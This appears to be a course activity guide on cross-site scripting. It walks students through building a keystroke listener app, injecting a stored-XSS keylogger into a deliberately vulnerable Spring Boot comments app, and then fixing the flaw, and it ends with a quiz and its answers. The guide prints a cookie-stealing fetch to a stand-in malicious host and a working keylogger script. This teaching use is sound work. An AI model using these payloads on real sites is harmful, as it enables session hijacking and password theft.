@@ -1,0 +1,351 @@
+Activity Guide 7: Cross-Site Script Injection
+Table of Contents
+Introduction2
+About Cross-Site Scripting2
+1. Stored XSS (Persistent XSS)3
+2. Reflected XSS (Non-persistent XSS)3
+3. DOM-based XSS3
+Build the Key Logger Trap3
+Build the Listener Application4
+Create a New Spring Boot Project4
+Create the Listener App11
+Test the Listener application.14
+Configure the Victim Application15
+Demonstrate the Fatal Flaw16
+About This Script20
+View the Hacker Application Logs.20
+Fix the XSS problem.22
+Sanitize Input22
+Use Thymeleaf Security24
+What is the Difference Between th:text and th:utext?25
+Key Takeaways26
+Check for Understanding26
+Deliverables28
+Introduction
+Cross-site scripting (XSS) is one of the most common security vulnerabilities found in web applications. It allows attackers to inject malicious scripts into webpages viewed by other users. This can lead to attacks, such as stealing session cookies, logging keystrokes, or even performing actions on behalf of the user without their knowledge. In this activity, you will explore different types of XSS attacks, understand how they work, and learn how to protect against them using proper input validation, sanitization techniques, and secure coding practices.
+The hands-on approach in this guide will walk you through setting up a malicious application, executing an XSS attack to demonstrate its impact, and finally, securing the vulnerable application to prevent such attacks. By the end of this exercise, you will understand how XSS attacks are executed and the best practices for mitigating them.
+Objectives
+Demonstrate XSS attacks in a web application.
+Identify and Differentiate Between Types of XSS Attacks
+Analyze and Debug Vulnerable Web Applications for XSS Issues
+Implement input validation and sanitization techniques to prevent XSS vulnerabilities.
+About Cross-Site Scripting
+How Malicious JavaScript is Delivered
+A common attack approach is to paste some malicious JavaScript code into an application's input forms. For example, a site may accept comments from users, store them in a database, and then display the comments to other users. These comments may contain JavaScript code that, when displayed to other users, executes commands that can compromise the reader. 
+Cookie Theft
+The hacker can use JavaScript to read a cookie value called the session ID and provide the hacker with a way to hijack a logged in session without knowing the user's password.
+Keylogging
+JavaScript can perform events on every keystroke. Those keystrokes can be sent to another server where they are stored in a database or text file. The hacker can browse through the logged keystrokes looking for passwords and other sensitive data.
+XSS attacks are generally classified into three main types: 
+Stored (Persistent) XSS
+Reflected (Non-persistent) XSS
+DOM-based XSS.
+ Each can be executed using various scripts and techniques. Here's a breakdown:
+1. Stored XSS (Persistent XSS)
+Description: The malicious script is permanently stored on the target server (e.g., in a database) and then served back to users when they request the relevant page. This type of XSS is particularly dangerous because every user who accesses the compromised page will run the malicious script.
+Example: An attacker could inject a script into a comments section of a blog, where the comment is stored in the database and displayed on the page for every visitor.
+<script>
+fetch("http://malicious-site.com/steal?cookie=" + document.cookie);
+</script>
+2. Reflected XSS (Non-persistent XSS)
+Description: In reflected XSS, the malicious script is not stored on the server but is instead reflected off a web server, typically via a URL or input field. The script is embedded in a link or form submission, and when the victim clicks the link or submits the form, the script is executed in their browser.
+3. DOM-based XSS
+Description: This type of XSS occurs when the client-side script (JavaScript) modifies the DOM (document object model) of the page in a way that causes the execution of malicious code. The payload is never sent to the server, making this type harder to detect.
+Example: An attacker could craft a URL that contains a malicious fragment identifier, which a vulnerable JavaScript function reads and executes.
+var userInput = location.hash.substring(1);
+document.getElementById("output").innerHTML = userInput;
+If the user navigates to http://vulnerable-site.com/#<script>alert('XSS');</script>, the script will be executed in the context of the page.
+Build the Key Logger Trap
+Creating the exploit requires these steps: 
+Identify website(s) with a vulnerability in handing improper user input.
+Build a "listener" application to capture data from the victim.
+Insert malicious JavaScript code into the data of an application.
+Search the log files for sensitive information such as passwords.
+Listener AppVictimVictimVictimVictimVictimListener AppVictimVictimVictimVictimVictim
+Listener App
+Victim
+Victim
+Victim
+Victim
+Victim
+Listener App
+Victim
+Victim
+Victim
+Victim
+Victim
+Figure 1 Multiple victims of the keylogger script send their keystrokes to a centralized listener app on a server.
+Build the Listener Application
+As seen in Figure 1. 
+Create a New Spring Boot Project
+Create a new Java project with Spring Boot Start Web and Spring Boot Dev Tools. Depending on your IDE, your project creation process will be slightly different. Here are three creation routines shown using (a) the online Spring Boot Initializer, (b) VS Code, and (c) Ellipse.
+Online Spring Boot Initializer
+Seen in Figure 2. 
+Figure 2 Starting a Spring Boot project using the online Spring Initializer service at http://start.spring.io Spring Boot Dev Tools and Spring Web dependencies are selected.
+The starter project is zipped and automatically downloaded, as shown in Figure 3. 
+Figure 3 Project is downloaded.
+Unzip the project and open it with your favorite IDE.
+Build a Spring Boot Application Using VS Code
+Seen in Figure 4. 
+In VS Code, ensure Java and the proper extensions are installed.
+Click the Create Java Project button.
+Choose Spring Boot (provided by Spring Initializer).
+Figure 4 Starting a Spring Boot project in VS Code.
+Select Maven Project, as seen in Figure 5. 
+Figure 5 Selecting Maven for the build tool.
+Choose the current version of Spring Boot, as seen in Figure 6.
+Figure 6 Selecting newest version of Spring Boot.
+Select Java, as shown in Figure 7.
+Figure 7 Selecting Java.
+Give your Group Id a name, as seen in Figure 8.
+Figure 8 Choosing your name for the Group ID.
+Give the Artifact Id a name, as seen in Figure 9.
+Figure 9 Using "hacker" for the artifact id.
+Select Jar package type, as seen in Figure 10.
+Figure 10 Selecting Jar as the package type.
+Select the Java version installed on your computer, as shown in Figure 11.
+Figure 11 Selecting 17 as the Java version installed on this computer.
+Choose the Spring Web dependency, as seen in Figure 12.
+Figure 12 Choosing the Spring Web dependency.
+Select the Spring Boot DevTools dependency, as seen in Figure 13.
+Figure 13 Selecting the Spring Boot DevTools as a dependency.
+Choose Enter to build the project, as seen in Figure 14.
+Figure 14 Selecting Enter to install the 2 dependencies.
+Eclipse Project Creation
+Start Eclipse for Java.
+File > New ? Project, as shown in Figure 15. 
+Figure 15 Choosing new project in Eclipse.
+Choose Maven Project, as shown in Figure 16. 
+Figure 16 Selecting Maven project type.
+Maven-archetype-quickstart, as seen in Figure 17. 
+Figure 17 Searching for maven archetype QuickStart.
+Name the Group ID, Artifact ID, as seen in Figure 18. 
+Figure 18 Naming the Group Id and Artifact Id values.
+Confirm the project creation, as seen in Figure 19.
+Figure 19 Responding Y in the command prompt.
+A success message will show, like the one seen in Figure 20. 
+Figure 20 Viewing the finished results of building a new project.
+Manually add the 2 dependencies (Spring Boot Starter Web, Spring Boot Devtools) the POM.XML file by searching Maven Central for the two dependencies, as seen in Figure 21. 
+Figure 21 A look at the POM file with two new dependencies.
+Create the Listener App
+Add a dependency that allows us to get the IP address from a request.  
+   <!-- https://mvnrepository.com/artifact/jakarta.servlet/jakarta.servlet-api -->
+        <dependency>
+            <groupId>jakarta.servlet</groupId>
+            <artifactId>jakarta.servlet-api</artifactId>
+            <version>6.1.0</version>
+            <scope>provided</scope>
+        </dependency>
+Open the application.properties file, as shown in Figure 22.
+Figure 22 Location of the applicaiton.properties file.
+Set the port to 8081, as seen in Figure 23.
+Figure 23 New config line shows port 8081 is assigned to the application.
+Create a KeyloggerController.java file, as seen in Figures 24 and 25. 
+Figure 24 Location of the new file.
+Figure 25 The Key Logger Controller has one method to respond to a GET request.
+Create a WebConfig.java file in the project, as seen in Figure 26.
+Figure 26 File location. 
+This configuration file allows you to customize how an application responds to clients. By default, all requests from external applications (different domain names) are denied. 
+Set this config to allow requests from any IP address, as shown in Figure 27. This allows the listener app to receive key logger updates from victims across the globe. 
+Figure 27 Contents of the Web Config file.
+Test the Listener Application
+Launch the hacker application, as seen in Figure 28.
+Figure 28 Application compiles and runs. Tomcat webserver is listening for requests on port 8081.
+Open a browser and navigate to http://localhost:8081/logKey?key=message, as seen in Figure 29. Use any string you like for "message."
+Figure 29 The application echoes the key value "message".
+Take a screenshot of the running application at this point.Paste the image into a Microsoft Word document.Put a caption below the image explaining what is being demonstrated.Take a screenshot of the running application at this point.Paste the image into a Microsoft Word document.Put a caption below the image explaining what is being demonstrated.
+Take a screenshot of the running application at this point.
+Paste the image into a Microsoft Word document.
+Put a caption below the image explaining what is being demonstrated.
+Take a screenshot of the running application at this point.
+Paste the image into a Microsoft Word document.
+Put a caption below the image explaining what is being demonstrated.
+Your message will appear, as seen in Figure 30. 
+Figure 30 The console log shows the key value "message" as well.
+Take a screenshot of the running application at this point.Paste the image into a Microsoft Word document.Put a caption below the image explaining what is being demonstrated.Take a screenshot of the running application at this point.Paste the image into a Microsoft Word document.Put a caption below the image explaining what is being demonstrated.
+Take a screenshot of the running application at this point.
+Paste the image into a Microsoft Word document.
+Put a caption below the image explaining what is being demonstrated.
+Take a screenshot of the running application at this point.
+Paste the image into a Microsoft Word document.
+Put a caption below the image explaining what is being demonstrated.
+Configure the Victim Application
+Download and open the file attached to this activity called CST-407-RS-T7.comments.zip
+Run the application from within the IDE.
+Open a new browser tab.
+Navigate to http://localhost:8080 
+Open the developer tools and show the JavaScript console, as seen in Figures 31 and 32.
+Figure 31 Web browser console is visible. User is filling out the new comment form.
+Figure 32 Comment 4 is now in the database.
+Demonstrate the Fatal Flaw
+This application has two vulnerabilities. 
+a) The input fields do not "sanitize" the input data. That is JavaScript and other languages are accepted as valid input without being neutralized. This opens to the door to running scripts on the page. 
+b) The fields in the table are also not sanitized for scripts.
+Add a new comment using the input form, as seen in Figure 33. 
+Figure 33 New comment includes malicious JavaScript code.
+In addition to some standard comment text, paste the following script. 
+<script>
+document.addEventListener('keypress', function(evt) {
+  var key = evt.key;  
+  if (key) {
+    var param = encodeURIComponent(key);
+    var url = "http://localhost:8081/logKey?key=" + param;
+    fetch(url, {
+      method: 'GET'
+    })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      return response.text();
+    })
+    .then(data => {
+      console.log('Key logged:', data);
+    })
+    .catch(error => {
+      console.error('There was a problem with the fetch operation:', error);
+    });
+  }
+});
+</script>
+Figure 34 shows the new comment. 
+Figure 34 New comment added without any apparent danger. The JavaScript input is part of the page but is not rendered as text.
+Enter another comment. This time we see activity in the browser console, as seen in Figure 35.
+Figure 35 "Key logged" messages appear in the console even though the user interface appears to be normal.
+Take a screenshot of the running application at this point.Paste the image into a Microsoft Word document.Put a caption below the image explaining what is being demonstrated.Take a screenshot of the running application at this point.Paste the image into a Microsoft Word document.Put a caption below the image explaining what is being demonstrated.
+Take a screenshot of the running application at this point.
+Paste the image into a Microsoft Word document.
+Put a caption below the image explaining what is being demonstrated.
+Take a screenshot of the running application at this point.
+Paste the image into a Microsoft Word document.
+Put a caption below the image explaining what is being demonstrated.
+Right-click and inspect the comments page, as seen in Figure 36.
+Figure 36 Viewing the HTML source of the rendered page.
+Scroll down to the comment you just added. You should be able to see that JavaScript code is part of the webpage, as seen in Figure 37. This code automatically executes when the page is displayed, causing a keypress action to be triggered whenever the user types something into a form.
+Figure 37 HTML view of the comments page shows that <script> section is part of the page structure.
+About This Script
+Notice that the JavaScript is a function that responds to any keystroke entered on this page. The script sends a "fetch" request to the listener server and delivers the value of the keystroke as a parameter of the request.
+View the Hacker Application Logs
+Switch to the Listener application.
+You should see that both in the Console as well as in a text file, the keystrokes from the Comments app are being recorded, as shown in Figure 38.
+Figure 38 The Listener app is responding to URL requests from the JavaScript application.
+Take a screenshot of the running application at this point.Paste the image into a Microsoft Word document.Put a caption below the image explaining what is being demonstrated.Take a screenshot of the running application at this point.Paste the image into a Microsoft Word document.Put a caption below the image explaining what is being demonstrated.
+Take a screenshot of the running application at this point.
+Paste the image into a Microsoft Word document.
+Put a caption below the image explaining what is being demonstrated.
+Take a screenshot of the running application at this point.
+Paste the image into a Microsoft Word document.
+Put a caption below the image explaining what is being demonstrated.
+Fix the XSS Problem
+The Comments application is purposely designed to have some vulnerable components. By default, Spring Boot Thymeleaf provides sufficient protection to prevent user-provided JavaScript from executing. However, additional steps should be taken to prevent the introduction of malicious code in the first place. Two remedies presented here will protect the application from XSS attacks: sanitize the user input and encode the output to disable scripts.
+Sanitize Input
+Search Maven Central for the OWASP Java Encoder as shown in Figure 39. 
+Figure 39 Screenshot of OWASP Java Encoder.
+Add the dependency to your project.
+<!-- https://mvnrepository.com/artifact/org.owasp.encoder/encoder -->
+<dependency>
+    <groupId>org.owasp.encoder</groupId>
+    <artifactId>encoder</artifactId>
+    <version>1.3.0</version>
+</dependency>
+Update the dependencies and re-run the application.
+Attempt to inject the JavaScript code, as shown in Figures 40 and 41.
+Figure 40 Another attempt at injecting the malicious keylogger script.
+Figure 41 The new comment has been rendered inert and displays on the application form as standard text, which cannot execute.
+Take a screenshot of the running application at this point.Paste the image into a Microsoft Word document.Put a caption below the image explaining what is being demonstrated.Take a screenshot of the running application at this point.Paste the image into a Microsoft Word document.Put a caption below the image explaining what is being demonstrated.
+Take a screenshot of the running application at this point.
+Paste the image into a Microsoft Word document.
+Put a caption below the image explaining what is being demonstrated.
+Take a screenshot of the running application at this point.
+Paste the image into a Microsoft Word document.
+Put a caption below the image explaining what is being demonstrated.
+Use Thymeleaf Security
+A second way to protect against malicious code injection is to use the preferred text display settings on Thymeleaf templates.
+Open the comments.html page.
+Modify the template, replacing th:utext with th:text, as seen in Figure 42.
+Use th:text instead of th:utextUse th:text instead of th:utext
+Use th:text instead of th:utext
+Use th:text instead of th:utext
+Figure 42 th:utext is being used to format the comment output.
+The default suggestion from most code assist tools is "th:text". This Comments application purposely introduced the utext tag as a vulnerability.  
+What is the difference between th:text and th:utext? 
+th:text
+th:text is used to safely output text to the HTML page. It escapes any HTML special characters, meaning that any tags or HTML code in the text will be converted to their corresponding HTML entities.
+Example: If you have a string like <script>alert('Hi Shad');</script>, using th:text will render it as &lt;script&gt;alert('Hi Shad');&lt;/script&gt;, which is safe and prevents any scripts from being executed.
+th:utext
+th:utext, on the other hand, outputs the text unescaped. This means that any HTML tags within the text will be rendered as actual HTML, and JavaScript or other code could be executed if present.
+Example: If you have a string like <script>alert('Hi Shad');</script>, using th:utext will render it as <script>alert('Hi Shad');</script>, which will execute the JavaScript, potentially leading to XSS attacks.
+ 
+Key Takeaways
+The key takeaways from this lesson include:
+Understanding XSS: You now understand how XSS attacks work, including how malicious scripts can be injected and executed within a web application.
+Preventing XSS: You learned how to prevent XSS by properly sanitizing user inputs with Java libraries designed to help with safe user input.
+Thymeleaf Best Practices: You learned the difference between th:text and th:utext in Thymeleaf, understanding when to use each to ensure that your application outputs content safely.
+Check for Understanding:
+Although not graded, these questions will prepare you for upcoming assessments.
+Which of the following is NOT a type of cross-site scripting (XSS) attack?
+A) Stored XSS
+B) Reflected XSS
+C) DOM-based XSS
+D) SQL Injection
+Correct Answer: D) SQL Injection
+What is the primary danger of a stored XSS (persistent XSS) attack?
+A) The script is executed only once.
+B) The script is stored on the server and executed whenever the page is loaded.
+C) The script is executed only on the client-side.
+D) The script modifies the document object model (DOM).
+Correct Answer: B) The script is stored on the server and executed whenever the page is loaded.
+In a reflected XSS attack, where is the malicious script typically stored?
+A) In the server's database.
+B) In a hidden form field.
+C) In the user's browser history.
+D) In a URL or input field, then reflected back by the server.
+Correct Answer: D) In a URL or input field, then reflected back by the server.
+Which of the following statements is true about DOM-based XSS?
+A) The payload is stored in the server's database.
+B) The malicious script is reflected off the server.
+C) The malicious code is executed by modifying the DOM on the client-side.
+D) The attack occurs only when the user clicks a specific button.
+Correct Answer: C) The malicious code is executed by modifying the DOM on the client-side.
+Which method can be used to prevent XSS attacks in a Spring Boot application using Thymeleaf?
+A) Using th:utext for outputting user data.
+B) Disabling the JavaScript on the client-side.
+C) Using th:text for outputting user data.
+D) Storing all user inputs in plain text.
+Correct Answer: C) Using th:text for outputting user data.
+What is the difference between th:text and th:utext in Thymeleaf?
+A) th:text outputs text unescaped, while th:utext escapes HTML special characters.
+B) th:utext outputs text unescaped, while th:text escapes HTML special characters.
+C) Both escape HTML special characters.
+D) Both output text unescaped.
+Correct Answer: B) th:utext outputs text unescaped, while th:text escapes HTML special characters.
+Why is it recommended to use th:text instead of th:utext when displaying user-generated content?
+A) th:text allows JavaScript to be executed.
+B) th:text ensures that any HTML or JavaScript code is escaped, preventing XSS attacks.
+C) th:utext is outdated and no longer supported.
+D) th:utext automatically strips all HTML tags.
+Correct Answer: B) th:text ensures that any HTML or JavaScript code is escaped, preventing XSS attacks.
+What is a common method used by attackers in a stored XSS attack?
+A) Inserting a script tag with JavaScript code into a comment section that is stored in the database.
+B) Reflecting the user input off the server.
+C) Injecting SQL commands to manipulate the database.
+D) Modifying the DOM directly on the client-side.
+Correct Answer: A) Inserting a script tag with JavaScript code into a comment section that is stored in the database.
+How can a hacker use JavaScript to perform keylogging in an XSS attack?
+A) By modifying the HTML directly.
+B) By using JavaScript to capture keystrokes and sending them to a remote server.
+C) By reflecting the script off the server.
+D) By storing the script in a hidden form field.
+Correct Answer: B) By using JavaScript to capture keystrokes and sending them to a remote server.
+Which dependency should be added to a Spring Boot project to help sanitize user input and prevent XSS attacks?
+A) Spring Boot DevTools
+B) Spring Boot Starter Web
+C) OWASP Java Encoder
+D) Thymeleaf Layout Dialect
+Correct Answer: C) OWASP Java Encoder
+Deliverables:
+Submit a Microsoft Word document with screenshots of the application being run. Show each screen of the output and put a caption under each picture explaining what is being demonstrated.
+In the same document, in one paragraph, write a summary of the key concepts that were demonstrated in this lesson.
+Convert the Microsoft Word document to a PDF.
+Submit a ZIP file of the project file. In order to save space, you can delete the target folder of the project. These folders contain the compiled version of the application and are automatically regenerated each time the build or run commands are executed.
+Attach the PDF document separately from the zip file.  Multiple files can be uploaded with an assignment.
